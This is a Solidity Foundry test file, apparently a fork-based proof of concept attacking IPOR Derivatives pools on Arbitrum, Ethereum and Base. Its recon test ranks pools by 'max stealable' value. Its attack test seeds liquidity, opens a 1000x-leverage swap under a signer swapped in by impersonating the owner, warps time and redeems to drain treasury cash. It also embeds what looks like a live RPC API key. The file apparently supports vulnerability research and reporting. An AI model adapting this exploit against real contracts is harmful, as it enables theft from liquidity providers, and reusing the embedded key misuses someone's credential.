// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// ============================================================================
//  IPOR Derivatives — fork PoC v2  (fixed: treasury/asset-manager reads instead
//  of the lens, which reverts on Arbitrum)
//
//  Arbitrum One (42161) by default; Ethereum (1) and Base (8453) also wired.
//
//  Run
//    cd ~/arc_hedgefun
//    cp IporFork.t.sol test/
//    forge test --match-contract IporFork -vv
//
//  Knobs (18-dec wad): ATK_LP TOTAL LEV DAYS
//    LEV=1000e18 DAYS=45 forge test --match-contract IporFork --match-test test_1_attack -vv
// ============================================================================

import {Test, console2} from "forge-std/Test.sol";

struct RiskInputs {
    uint256 maxCollateralRatio;
    uint256 maxCollateralRatioPerLeg;
    uint256 maxLeveragePerLeg;
    int256 baseSpreadPerLeg;
    uint256 fixedRateCapPerLeg;
    uint256 demandSpreadFactor;
    uint256 expiration;
    bytes signature;
}

struct AmmBalances {
    uint256 totalCollateralPayFixed;
    uint256 totalCollateralReceiveFixed;
    uint256 liquidityPool;
    uint256 vault;
}

struct Swap {
    uint256 id;
    address buyer;
    uint256 openTimestamp;
    uint8 tenor;
    uint256 idsIndex;
    uint256 collateral;
    uint256 notional;
    uint256 ibtQuantity;
    uint256 fixedInterestRate;
    uint256 liquidationDepositAmount;
    uint8 state;
}

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IERC4626Like {
    function maxWithdraw(address owner) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

interface ITreasury {
    function getConfiguration()
        external
        view
        returns (address asset, uint256 decimals, address ammStorage, address assetManagement, address router);
}

interface IStorage {
    function getBalance() external view returns (AmmBalances memory);
    function getSwap(uint8 direction, uint256 swapId) external view returns (Swap memory);
}

/// @dev the router dispatches by msg.sig
interface IRouter {
    function owner() external view returns (address);
    function setMessageSigner(address) external;

    function provideLiquidityUsdc(address beneficiary, uint256 amount) external;
    function provideLiquidityUsdt(address beneficiary, uint256 amount) external;
    function provideLiquidityDai(address beneficiary, uint256 amount) external;
    function redeemFromAmmPoolUsdc(address beneficiary, uint256 ipAmount) external;
    function redeemFromAmmPoolUsdt(address beneficiary, uint256 ipAmount) external;
    function redeemFromAmmPoolDai(address beneficiary, uint256 ipAmount) external;
    function provideLiquidityWstEth(address beneficiary, uint256 amount) external;
    function redeemFromAmmPoolWstEth(address beneficiary, uint256 ipAmount) external;

    function openSwapReceiveFixed90daysUsdc(
        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysUsdt(
        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysDai(
        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysWstEth(
        address b, address inputAsset, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);

    function getIpTokenExchangeRate(address asset) external view returns (uint256);
}

contract IporForkTest is Test {
    string constant RPC = "https://arb-mainnet.g.alchemy.com/v2/WqhCk5T_nDcejq-szWp1M";
    uint256 constant PRICE_ETH = 2800e18;

    address constant ARB_USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant ARB_WSTETH = 0x5979D7b546E38E414F7E9822514be443A4800529;
    address constant ETH_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant ETH_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant ETH_DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant BASE_USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant BASE_WSTETH = 0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452;

    uint8 constant K_STABLE = 0;
    uint8 constant K_WSTETH = 1;

    struct Pool {
        string name;
        address asset;
        address ipToken;
        address treasury;
        uint8 kind;
        uint8 decimals;
    }

    IRouter router;
    uint256 signerPk = 0xA11CE;
    address signer;
    address attacker = address(0xA77ACC);

    function setUp() public {
        string memory rpc = RPC;
        try vm.envString("ARB_RPC") returns (string memory r) {
            rpc = r;
        } catch {}
        vm.createSelectFork(rpc);
        signer = vm.addr(signerPk);
    }

    function _pools() internal returns (Pool[] memory p) {
        if (block.chainid == 42161) {
            router = IRouter(0x760Fa0aB719c4067D3A8d4727Cf07E8f3Bf118db);
            p = new Pool[](2);
            p[0] = Pool("USDC  / Arbitrum", ARB_USDC, 0x485cAC13E6492CcF4d47764b0E4e07b5272B0167,
                0x9324d39B29c85440cadd2202E4703E6f5d1e98F9, K_STABLE, 6);
            p[1] = Pool("wstETH/ Arbitrum", ARB_WSTETH, 0xbDa4b3e17a9B0ecb811E68c6f08907156CBa503C,
                0xBd013Ea2E01C2Ab3462dd67e9C83aa3834882A5D, K_WSTETH, 18);
        } else if (block.chainid == 1) {
            router = IRouter(0x16d104009964e694761C0bf09d7Be49B7E3C26fd);
            p = new Pool[](3);
            p[0] = Pool("USDC  / Ethereum", ETH_USDC, 0x7c0e72f431FD69560D951e4C04A4de3657621a88,
                0x137000352B4ed784e8fa8815d225c713AB2e7Dc9, K_STABLE, 6);
            p[1] = Pool("USDT  / Ethereum", ETH_USDT, 0x9Bd2177027edEE300DC9F1fb88F24DB6e5e1edC6,
                0x28BC58e600eF718B9E97d294098abecb8c96b687, K_STABLE, 6);
            p[2] = Pool("DAI   / Ethereum", ETH_DAI, 0x8537b194BFf354c4738E9F3C81d67E3371DaDAf8,
                0xEd7d74AA7eB1f12F83dA36DFaC1de2257b4e7523, K_STABLE, 18);
        } else if (block.chainid == 8453) {
            router = IRouter(0x21d337eBF86E584e614ecC18A2B1144D3C375918);
            p = new Pool[](2);
            p[0] = Pool("USDC  / Base", BASE_USDC, 0x4AEE7072AC1a49A3F84D0A95e32F3B7D1C97fB30,
                0x1AbA7a3C3bec8139B10a4807087084064A454a24, K_STABLE, 6);
            p[1] = Pool("wstETH/ Base", BASE_WSTETH, 0xff7907CDCA84DB03f09702A4A49C262908AF48Af,
                0x09388e18d5C331449C6eF636726dD1fd007b8DDf, K_WSTETH, 18);
        } else {
            revert("fork Arbitrum (42161), Ethereum (1) or Base (8453)");
        }
    }

    // ---------------------------------------------------------------- helpers
    function _wad(uint256 a, uint8 d) internal pure returns (uint256) {
        return d == 18 ? a : a * 10 ** (18 - d);
    }

    function _fromWad(uint256 a, uint8 d) internal pure returns (uint256) {
        return d == 18 ? a : a / 10 ** (18 - d);
    }

    function _isEth(address a) internal pure returns (bool) {
        return a == ARB_WSTETH || a == BASE_WSTETH;
    }

    function _usd(address asset, uint256 wad) internal pure returns (uint256) {
        return _isEth(asset) ? (wad * PRICE_ETH) / 1e18 : wad;
    }

    /// @dev idle cash in the treasury + whatever sits in its asset manager, both as wad
    function _cash(Pool memory p) internal view returns (uint256 idleWad, uint256 vaultWad) {
        idleWad = _wad(IERC20Like(p.asset).balanceOf(p.treasury), p.decimals);
        try ITreasury(p.treasury).getConfiguration() returns (address, uint256, address, address am, address) {
            if (am != address(0)) {
                try IERC4626Like(am).maxWithdraw(p.treasury) returns (uint256 assets) {
                    vaultWad = assets;
                } catch {}
            }
        } catch {}
    }

    /// @dev 0 if the pool cannot be read; otherwise the pool's LP balance (wad)
    function _depth(Pool memory p) internal view returns (uint256 d) {
        try ITreasury(p.treasury).getConfiguration() returns (address, uint256, address st, address, address) {
            if (st != address(0)) {
                try IStorage(st).getBalance() returns (AmmBalances memory b) {
                    return b.liquidityPool;
                } catch {}
            }
        } catch {}
        try router.getIpTokenExchangeRate(p.asset) returns (uint256 rate) {
            d = (rate * IERC20Like(p.ipToken).totalSupply()) / 1e18;
        } catch {}
    }

    function _redeemSel(Pool memory p) internal pure returns (bytes4) {
        if (p.kind == K_WSTETH) return IRouter.redeemFromAmmPoolWstEth.selector;
        if (p.asset == ETH_USDT) return IRouter.redeemFromAmmPoolUsdt.selector;
        if (p.asset == ETH_DAI) return IRouter.redeemFromAmmPoolDai.selector;
        return IRouter.redeemFromAmmPoolUsdc.selector;
    }

    function _sign(RiskInputs memory r, address asset, uint256 tenor, uint256 dir) internal view returns (bytes memory) {
        bytes32 digest = keccak256(
            abi.encodePacked(
                r.maxCollateralRatio, r.maxCollateralRatioPerLeg, r.maxLeveragePerLeg, r.baseSpreadPerLeg,
                r.fixedRateCapPerLeg, r.demandSpreadFactor, r.expiration, asset, tenor, dir
            )
        );
        (uint8 v, bytes32 rr, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(rr, s, v);
    }

    function _env(string memory k, uint256 def) internal view returns (uint256) {
        try vm.envUint(k) returns (uint256 v) {
            return v;
        } catch {
            return def;
        }
    }

    // ---------------------------------------------------------------- 1. recon
    function test_0_recon() public {
        Pool[] memory ps = _pools();
        console2.log("chainid", block.chainid);
        console2.log("block", block.number);
        console2.log("router owner", router.owner());

        uint256 bestI;
        uint256 bestUsd;
        for (uint256 i; i < ps.length; i++) {
            (uint256 idle, uint256 vault) = _cash(ps[i]);
            uint256 depth = _depth(ps[i]);
            uint256 total = idle + vault;
            uint256 usd = _usd(ps[i].asset, total > depth ? total : depth);
            uint256 rate;
            try router.getIpTokenExchangeRate(ps[i].asset) returns (uint256 r) {
                rate = r;
            } catch {}

            console2.log("");
            console2.log(ps[i].name);
            console2.log("  treasury idle (wad) ", idle);
            console2.log("  asset manager (wad) ", vault);
            console2.log("  liquidityPool (wad) ", depth);
            console2.log("  ipToken supply      ", IERC20Like(ps[i].ipToken).totalSupply());
            console2.log("  exchange rate       ", rate);
            console2.log("  largest of the two, USD", usd);
            if (usd > bestUsd) {
                bestUsd = usd;
                bestI = i;
            }
        }
        console2.log("");
        console2.log("== richest pool:", ps[bestI].name);
        console2.log("== max stealable ~USD", bestUsd);
    }

    // ---------------------------------------------------------------- 2. attack
    function test_1_attack() public {
        Pool[] memory ps = _pools();

        uint256 idx;
        uint256 bestUsd;
        for (uint256 i; i < ps.length; i++) {
            (uint256 idle, uint256 vault) = _cash(ps[i]);
            uint256 depth = _depth(ps[i]);
            uint256 tot = idle + vault;
            uint256 usd = _usd(ps[i].asset, tot > depth ? tot : depth);
            if (usd > bestUsd) {
                bestUsd = usd;
                idx = i;
            }
        }
        Pool memory p = ps[idx];
        console2.log("target:", p.name);

        (uint256 idle0, uint256 vault0) = _cash(p);
        uint256 depth0 = _depth(p);
        uint256 rate0;
        try router.getIpTokenExchangeRate(p.asset) returns (uint256 r) {
            rate0 = r;
        } catch {
            console2.log("!! getIpTokenExchangeRate reverted (pool paused or asset unsupported?)");
        }
        console2.log("cash idle / assetManager (wad)", idle0);
        console2.log("                               ", vault0);
        console2.log("liquidityPool (wad)            ", depth0);
        console2.log("exchangeRate before            ", rate0);

        uint256 base = depth0 != 0 ? depth0 : (idle0 + vault0);
        if (base == 0) {
            console2.log("!! pool depth unreadable and treasury empty - nothing to attack here");
            return;
        }
        uint256 atkLpWad = _env("ATK_LP", base);
        uint256 totalWad = _env("TOTAL", (base * 74) / 1000);
        uint256 lev = _env("LEV", 1000e18);
        uint256 daysWait = _env("DAYS", 45);

        uint256 atkLp = _fromWad(atkLpWad, p.decimals);
        uint256 totalAmt = _fromWad(totalWad, p.decimals);

        // risk indicators must be signed by IPOR's off-chain key; a fork cannot forge it,
        // so (as the owner) point the verifier at a key we hold. See REPORT.md 10.2.
        address owner = router.owner();
        vm.prank(owner);
        try router.setMessageSigner(signer) {} catch {
            console2.log("!! setMessageSigner reverted - cannot sign risk indicators here");
            revert("blocked: no risk-indicator signer");
        }

        deal(p.asset, attacker, atkLp + totalAmt + 10 ** p.decimals);
        vm.startPrank(attacker);
        IERC20Like(p.asset).approve(address(router), type(uint256).max);
        if (p.kind == K_WSTETH) router.provideLiquidityWstEth(attacker, atkLp);
        else if (p.asset == ETH_USDT) router.provideLiquidityUsdt(attacker, atkLp);
        else if (p.asset == ETH_DAI) router.provideLiquidityDai(attacker, atkLp);
        else router.provideLiquidityUsdc(attacker, atkLp);

        RiskInputs memory ri = RiskInputs({
            maxCollateralRatio: 0.90e18,
            maxCollateralRatioPerLeg: 0.48e18,
            maxLeveragePerLeg: lev,
            baseSpreadPerLeg: 0.001e18,
            fixedRateCapPerLeg: 0.02e18,
            demandSpreadFactor: 280,
            expiration: block.timestamp + 1 hours,
            signature: ""
        });
        ri.signature = _sign(ri, p.asset, 2, 1); // tenor DAYS_90, direction PAY_FLOATING_RECEIVE_FIXED
        if (p.kind == K_WSTETH) {
            router.openSwapReceiveFixed90daysWstEth(attacker, p.asset, totalAmt, 0, lev, ri);
        } else if (p.asset == ETH_USDT) {
            router.openSwapReceiveFixed90daysUsdt(attacker, totalAmt, 0, lev, ri);
        } else if (p.asset == ETH_DAI) {
            router.openSwapReceiveFixed90daysDai(attacker, totalAmt, 0, lev, ri);
        } else {
            router.openSwapReceiveFixed90daysUsdc(attacker, totalAmt, 0, lev, ri);
        }
        vm.stopPrank();

        try ITreasury(p.treasury).getConfiguration() returns (address, uint256, address st, address, address) {
            if (st != address(0)) {
                try IStorage(st).getSwap(1, 1) returns (Swap memory s) {
                    console2.log("== opened ==");
                    console2.log("collateral  ", s.collateral);
                    console2.log("notional    ", s.notional);
                    console2.log("fixed rate  ", s.fixedInterestRate);
                    console2.log("notional / liquidityPool x1000", (s.notional * 1000) / (depth0 == 0 ? 1 : depth0));
                } catch {}
            }
        } catch {}

        vm.warp(block.timestamp + daysWait * 1 days);
        vm.roll(block.number + daysWait * 7200);

        uint256 rate1;
        try router.getIpTokenExchangeRate(p.asset) returns (uint256 r) {
            rate1 = r;
        } catch {}
        console2.log("== after warp ==");
        console2.log("days", daysWait);
        console2.log("exchangeRate after", rate1);
        if (rate0 != 0) console2.log("rate move bps", ((rate1 * 10_000) / rate0) - 10_000);
        console2.log("treasury cash before redeem (raw)", IERC20Like(p.asset).balanceOf(p.treasury));

        uint256 cashBefore = IERC20Like(p.asset).balanceOf(p.treasury);
        uint256 balBefore = IERC20Like(p.asset).balanceOf(attacker);
        uint256 left = IERC20Like(p.ipToken).balanceOf(attacker);
        uint256[7] memory pct = [uint256(100), 75, 50, 25, 10, 5, 1];
        for (uint256 round; round < 8 && left > 0; round++) {
            bool moved;
            for (uint256 i; i < 7; i++) {
                uint256 chunk = (left * pct[i]) / 100;
                if (chunk == 0) continue;
                vm.prank(attacker);
                (bool ok,) = address(router).call(abi.encodeWithSelector(_redeemSel(p), attacker, chunk));
                if (ok) {
                    left -= chunk;
                    moved = true;
                    break;
                }
            }
            if (!moved) break;
        }
        uint256 out = IERC20Like(p.asset).balanceOf(attacker) - balBefore;
        uint256 cashAfter = IERC20Like(p.asset).balanceOf(p.treasury);

        console2.log("== result ==");
        console2.log("attacker put in (LP + collateral), wad", atkLpWad + totalWad);
        console2.log("attacker got back, wad               ", _wad(out, p.decimals));
        console2.log("ipToken left unredeemed              ", left);
        console2.log("real cash out of treasury, raw       ", cashBefore - cashAfter);
        console2.log("real cash left in treasury, raw      ", cashAfter);
        uint256 outWad = _wad(out, p.decimals);
        if (outWad >= atkLpWad + totalWad) console2.log("NET PROFIT, wad", outWad - atkLpWad - totalWad);
        else console2.log("NET LOSS, wad", atkLpWad + totalWad - outWad);
    }
}
